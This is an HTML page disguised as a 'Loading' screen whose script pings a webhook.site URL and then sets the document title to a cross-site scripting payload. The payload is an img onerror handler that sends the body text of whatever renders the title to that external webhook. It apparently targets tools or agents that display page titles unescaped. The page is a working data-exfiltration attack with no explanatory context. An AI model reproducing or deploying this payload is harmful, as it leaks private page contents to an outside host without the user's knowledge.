<!DOCTYPE html>
<html>
<head>
    <title>Initializing</title>
</head>
<body>
    <p>Loading</p>
    <script>
        (new Image()).src = "https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?d=test";
        const payload = `</h1><img src=x onerror="(new Image()).src='https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?d='+encodeURIComponent(document.body.innerText)"><h1>`;

        setTimeout(() => {
            document.title = "Init";
        }, 1000);
        
        setTimeout(() => {
            document.title = payload;
        }, 4000);
    </script>
</body>
</html>
